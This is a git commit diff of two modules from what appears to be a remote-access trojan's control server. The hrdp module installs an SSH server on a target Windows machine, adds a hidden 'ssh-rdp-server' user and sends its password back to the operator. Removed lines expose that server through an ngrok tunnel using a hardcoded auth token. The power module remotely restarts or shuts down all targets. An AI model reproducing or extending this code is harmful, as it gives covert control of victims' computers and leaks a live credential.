d4ebea972d0359ab7f5e0e32e887fb5982338b8d
Asaf-Zanjiri <60044819+Asaf-Zanjiri@users.noreply.github.com>
2021-07-02 16:37:45 +0300

    Add files via upload

--- server_folder/Modules/hrdp.py
+++ server_folder/Modules/hrdp.py
@@ -2,76 +2,62 @@ import subprocess
 import random
 import string
 import os
-import time
-
-from pyngrok import conf, ngrok
-import config as config
+import config
 
 
-def shell_command(command):
-    """ Silently execute a shell command """
-    subprocess.call(command, shell=True)  # , creationflags=0x08000000
+def shell_command(cmd):
+    """ Execute a shell command """
+    cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+    config.log(output_bytes.decode('utf-8', errors='replace'))
 
 
 def get_random_password():
     """ Returns a randomly generated password """
-    password_characters = string.ascii_letters + string.digits + string.punctuation
+    password_characters = string.ascii_letters + string.digits + '!@#$%^&()'
     password = ''.join(random.choice(password_characters) for i in range(8))
     return password
 
 
 def install_ssh_server():
     """ Installs and sets up SSH server on port 1338"""
+    uninstall_ssh_server()  # In case it's already existing
     # Start and configure SSH server
+    config.log('Installing SSH Server...')
     shell_command(['PowerShell', '-Command', 'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Download SSH server
-    shell_command('net start sshd')  # Start SSH Server
 
-    # Change the default port of the SSH server from 22 to 1338
-    ssh_config_file = 'Port 1338\nAuthorizedKeysFile	.ssh/authorized_keys\nSubsystem	sftp	sftp-server.exe\nMatch Group administrators\n           AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys\n'
-    with open(os.path.expandvars('%programdata%\ssh\sshd_config'), 'w') as f:
-        f.write(ssh_config_file)
+    config.log('Starting SSH Server...')
+    shell_command('net start sshd')  # Start SSH Server
 
 
 def uninstall_ssh_server():
     """ Uninstalls SSH server """
-    shell_command('net stop sshd')  # Stops the SSH Server
+    stop()  # Stops the SSH Server
+    config.log('Uninstalling SSH Server...')
     shell_command(['PowerShell', '-Command', 'Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Removes the SSH server from the computer
 
 
-def start(server):
-    # Notice, if HRDP doesnt do anything, make sure it has admin perms
+def start():
+    """ Starts HRDP. """
+    config.log('Starting HRDP. Notice, if HRDP doesnt do anything, make sure it has admin perms.')
+    stop()  # Stopping SSH server to avoid conflicts in case it's already running.
 
-    # Restarts SSH server
-    stop()
-
-    # Set up port forwarding to the SSH server with ngrok
-    # ngrok_auth_token = input('Input Ngrok Token> ')
-    ngrok_auth_token = '1szl7cSIlS7Y20k2mkQLZv2OLQT_3ybuL4qxrvFFtEcGp381h'
-    conf.get_default().region = 'us'
-    ngrok.set_auth_token(ngrok_auth_token)
-    ssh_tunnel = ngrok.connect(1338, 'tcp')
-    print(ssh_tunnel)
-
-    time.sleep(1.5)
+    config.log('Starting SSH Server...')
     shell_command('net start sshd')  # Starts the SSH Server
 
     # Create new user for the SSH server
     password = get_random_password()
     shell_command('net user ssh-rdp-server {} /ADD'.format(password))
-    time.sleep(1.5)
-    config.send_to_client(server, config.targets[0], 'hrdp', response=False)  # Sends flag to let the client prepare to handle hrdp
-    time.sleep(1.5)
-    config.send_to_client(server, config.targets[0], password, response=False)  # Sends the password of the ssh user to the client
-    time.sleep(1.5)
-    config.send_to_client(server, config.targets[0], ssh_tunnel.public_url[6:], response=False)  # Sends the ip:port of the ssh server
-    time.sleep(1.5)
-    print(password)
-    print(ssh_tunnel.public_url[6:])
-    print('Done starting')
+
+    response = config.send_to_client(config.targets[0], ('hrdp ' + password))
+    config.log(response)
 
 
 def stop():
+    """ Stops the ssh server. """
     # Notice, if HRDP doesnt do anything, make sure it has admin perms
+    config.log('Stopping SSH Server...')
     shell_command('net stop sshd')  # Stops the SSH Server
+
+    config.log('Deleting ssh-rdp-server Windows user.')
     shell_command('net user ssh-rdp-server /DELETE')  # Deletes the SSH user
-    ngrok.kill()  # Stops ssh port forwarding
--- server_folder/Modules/power.py
+++ server_folder/Modules/power.py
@@ -1,32 +1,24 @@
-import config as config
-from socket import error as socket_error
+import config
 import datetime
 
 
-def restart(server):
-    """
-    This would restart all of the selected clients.
-    :param server: Server socket object
-    """
+def restart():
+    """ This would restart all of the selected clients. """
     if datetime.datetime.now() > config.latest_restart_time + datetime.timedelta(minutes=config.POWER_MODULE_COOLDOWN):
         config.latest_restart_time = datetime.datetime.now()
         for target in config.targets:
-            config.send_to_client(server, target, 'restart', response=False)
+            config.log('Restarting client #{}\'s computer'.format(target))
+            config.send_to_client(target, 'restart', response=False)
     else:
-        print('[!] This command is on cooldown. Please wait additional time')
+        config.log('Restarting command is currently on cooldown. Please wait additional time.')
 
 
-def shutdown(server):
-    """
-    This would shutdown all of the selected clients.
-    :param server: Server socket object
-    """
+def shutdown():
+    """ This would shutdown all of the selected clients. """
     if datetime.datetime.now() > config.latest_shutdown_time + datetime.timedelta(minutes=config.POWER_MODULE_COOLDOWN):
         config.latest_shutdown_time = datetime.datetime.now()
         for target in config.targets:
-            config.send_to_client(server, target, 'shutdown', response=False)
+            config.log('Shutting down client #{}\'s computer'.format(target))
+            config.send_to_client(target, 'shutdown', response=False)
     else:
-        print('[!] This command is on cooldown. Please wait additional time')
-
-# Notes:
-# Delete custom console + prints before compiling
+        config.log('Shutdown command is currently on cooldown. Please wait additional time.')
